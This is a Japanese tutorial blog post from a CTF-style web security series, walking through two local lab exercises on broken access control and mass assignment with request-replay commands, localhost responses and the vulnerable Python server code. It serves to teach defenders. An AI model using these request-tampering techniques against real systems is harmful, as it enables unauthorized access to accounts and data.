---
title: CTF形式で徹底的に学ぶWeb Security ③ - 不十分なアクセス制御
tags: Security CTF Web ハッキング セキュリティ対策
author: Koukyosyumei
slide: false
---
コロンビア大学の博士課程でAI・システムセキュリティの研究をしているKoukyosyumeiです。[前回の記事](https://qiita.com/Koukyosyumei/items/ef83e0a3399312203c77)に引き続き、本稿ではアクセス制御が不十分なウェブサイトへの攻撃を実験していきたいと思います。

## セットアップ

まだh5iをインストールしていない場合は、公式の手順に従ってバイナリをダウンロードしましょう。

```console
$ curl -fsSL https://h5i.dev/install.sh | sh -s -- --websec
```

h5iのブラウザセッションは、実際のChromiumをagent-browser経由で操作します。Node.jsを用意したうえで、agent-browserをインストールし、Chromiumを取得しておきます。

```console
$ npm install -g agent-browser
$ agent-browser install
```

Linuxのarm64環境など、agent-browserが同梱のChromiumを用意できない場合は、システムのChromiumを指すように`AGENT_BROWSER_EXECUTABLE_PATH`を設定します。

```console
$ export AGENT_BROWSER_EXECUTABLE_PATH=/path/to/chrome
```

次に、h5iのチュートリアル用レポジトリをクローンします。このレポジトリには、CTF形式のラボが格納されており、基本的にはサーバーやページの脆弱性を利用してフラグを見つけることがゴールです。

```console
$ git clone https://github.com/h5i-dev/h5i-tutorial.git
$ cd h5i-tutorial/websec
```

## 課題 8: ユーザーの偽装

```console
$ ./run.sh 08
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/255f0b11-ca13-47be-9b58-dd4f6888e77c.png)

チュートリアルのGoalには、`Goal: read the report as bob.`と書いてあるので、ユーザーをBobとしてレポートを読んでみましょう。

まず、bobという名前のセッションでページを開きます。

```console
$ h5i browser open 'http://127.0.0.1:9080/' \
  --session bob --new
```

ページを開くと、Chromiumが裏側でさまざまなリクエストを送るため、リクエストのidは連番にはなりません。目的のリクエストのidは`requests`で確認します。

```console
$ h5i websec requests --session bob --url-contains 127.0.0.1
req_4             GET http://127.0.0.1:9080/
res_4         200 GET http://127.0.0.1:9080/ (124 bytes, 1ms)
req_9             GET http://127.0.0.1:9080/favicon.ico
res_9         404 GET http://127.0.0.1:9080/favicon.ico (46 bytes, 0ms)
```

ページを開いたときのGETリクエスト（ここでは`req_4`です。番号は環境によって変わるので、実際に確認したidに読み替えてください）を`POST /login`に書き換えて、bobとしてログインします。

```console
$ h5i websec replay req_4 --session bob --create \
  --set method=POST \
  --set path=/login \
  --set header.Content-Type=application/json \
  --set json.user=bob

res_12 ← req_12 · 200 · 45 bytes · 1 ms
sent  POST http://127.0.0.1:9080/login
set   method=POST (was GET)
set   path=/login (was /)
set   header.Content-Type=application/json (created)
set   json.user=bob (created)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:49:58 GMT
content-type: application/json
content-length: 45

{"ok": true, "user": "bob", "role": "intern"}
```

ログインによって、bobの`sid`クッキーがこのセッションに保存されました。このクッキーを添えて、マネージャー専用のレポートエンドポイントにアクセスします。`replay`は保存されたリクエストのバイト列をそのまま送るので、bobの認証情報を添えて送るには`--as bob`を使います。

```console
$ h5i websec replay req_4 --session bob --create \
  --set path=/api/reports/quarterly \
  --as bob

res_13 ← req_13 · 200 · 93 bytes · 0 ms
sent  GET http://127.0.0.1:9080/api/reports/quarterly
set   path=/api/reports/quarterly (was /)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:49:58 GMT
content-type: application/json
content-length: 93

{"as": "bob", "role": "intern", "revenue": 4120000, "audit_key": "FLAG{cross_session_authz}"}
```

フラグが取れてしまいました!

これは、サーバー側のアクセス制御が不十分で、ユーザーがマネージャーかインターンかをチェックせずに、FLAGを返してしまうからです。

```python
user = SESSIONS.get(req.cookies.get("sid", ""))
if not user:
    return js({"error": "sign in"}, 401)

return js({
    "as": user,
    "role": USERS[user],
    "revenue": 4_120_000,
    "audit_key": FLAG,
})
```

## 課題 9: マス・アサインメント

```console
$ ./run.sh 09
```

多くのWebフレームワークでは、クライアントからのHTTPリクエストパラメータをプログラム内のオブジェクトやモデルの属性に一括で自動代入する、マス・アサインメントと呼ばれる機能があります。この機能はとても便利な一方で、攻撃者が開発者の想定していないフィールド（例: is_admin や role などの権限フラグ）をリクエストに含めて送信し、不正にデータを改ざんする危険性があります。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/0380838f-4cc4-4c66-82c3-19bf4c02dcc1.png)

まずは、ページを開きます。

```console
$ h5i browser open 'http://127.0.0.1:9090/' \
  --session lab09 --new
```

ここでも、目的のリクエストのidを`requests`で確認しておきます。

```console
$ h5i websec requests --session lab09 --url-contains 127.0.0.1
req_3             GET http://127.0.0.1:9090/
res_3         200 GET http://127.0.0.1:9090/ (142 bytes, 1ms)
req_7             GET http://127.0.0.1:9090/favicon.ico
```

まずは普通のアカウントを作成してみましょう。ページを開いたときのGETリクエスト（ここでは`req_3`）を`POST /api/register`に書き換えて送ります。

```console
$ h5i websec replay req_3 --session lab09 --create \
  --set method=POST \
  --set path=/api/register \
  --set header.Content-Type=application/json \
  --set json.username=ordinary \
  --set json.email=ordinary@example.test \
  --set json.password=hunter2

res_12 ← req_12 · 200 · 73 bytes · 1 ms
sent  POST http://127.0.0.1:9090/api/register
set   method=POST (was GET)
set   path=/api/register (was /)
set   header.Content-Type=application/json (created)
set   json.username=ordinary (created)
set   json.email=ordinary@example.test (created)
set   json.password=hunter2 (created)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:50:24 GMT
content-type: application/json
content-length: 73

{"ok": true, "token": "a94cb27252094077df10706138bbc0cf", "plan": "free"}
```

レスポンスに含まれるトークンを変数にメモしておきます。

```console
$ NORMAL_TOKEN='a94cb27252094077df10706138bbc0cf'
```

このトークンでadminのapiにアクセスしても、はじかれてしまいます。

```console
$ h5i websec replay req_3 --session lab09 --create \
  --set path=/api/admin/keys \
  --set "header.Authorization=Bearer $NORMAL_TOKEN"

res_13 ← req_13 · 403 · 24 bytes · 0 ms
sent  GET http://127.0.0.1:9090/api/admin/keys
set   path=/api/admin/keys (was /)
set   header.Authorization=Bearer a94cb27252094077df10706138bbc0cf (created)

HTTP/1.1 403
server: miniweb
date: Sat, 21 Nov 2026 12:50:28 GMT
content-type: application/json
content-length: 24

{"error": "admins only"}
```

次に、マス・アサインメントを用いて、`is_admin`の書き換えを狙います。登録リクエストに`json.is_admin=true`を加えて送ります。

```console
$ h5i websec replay req_3 --session lab09 --create \
  --set method=POST \
  --set path=/api/register \
  --set header.Content-Type=application/json \
  --set json.username=climber \
  --set json.email=climber@example.test \
  --set json.password=hunter2 \
  --set json.is_admin=true

res_15 ← req_15 · 200 · 73 bytes · 1 ms
sent  POST http://127.0.0.1:9090/api/register
set   method=POST (was GET)
set   path=/api/register (was /)
set   header.Content-Type=application/json (created)
set   json.username=climber (created)
set   json.email=climber@example.test (created)
set   json.password=hunter2 (created)
set   json.is_admin=true (created)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:50:32 GMT
content-type: application/json
content-length: 73

{"ok": true, "token": "09040f3ba2bbd91505f524b77ce24253", "plan": "free"}
```

admin権限を持つアカウントのトークンが手に入りました。これも変数にメモしておきます。

```console
$ ADMIN_TOKEN='09040f3ba2bbd91505f524b77ce24253'
```

adminのapiにもう一度アクセスし、フラグを取りましょう。

```console
$ h5i websec replay req_3 --session lab09 --create \
  --set path=/api/admin/keys \
  --set "header.Authorization=Bearer $ADMIN_TOKEN"

res_16 ← req_16 · 200 · 63 bytes · 1 ms
sent  GET http://127.0.0.1:9090/api/admin/keys
set   path=/api/admin/keys (was /)
set   header.Authorization=Bearer 09040f3ba2bbd91505f524b77ce24253 (created)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:50:35 GMT
content-type: application/json
content-length: 63

{"signing_keys": ["k1", "k2"], "root": "FLAG{mass_assignment}"}
```

この脆弱性は、以下のようなサーバー側のバグによって発生しています。

```python
DEFAULTS = {
    "username": "",
    "email": "",
    "password": "",
    "plan": "free",
    "is_admin": False,
    "credits": 0,
}

row = {**DEFAULTS, **payload}
USERS[row["username"]] = row
```

これはpythonで実装されており、payloadに`is_admin: True`が含まれていると、`row`の中の`is_admin`が`True`に書き換えられてしまいます。

## まとめ

最後にセッションを片付けておきましょう。

```console
$ h5i browser close --session bob
$ h5i browser close --session lab09
$ ./run.sh stop
```

**参考**

- https://h5i.dev/guides/recon-and-idor/
- https://h5i.dev/guides/broken-access-control/
- https://qiita.com/Koukyosyumei/items/ef83e0a3399312203c77
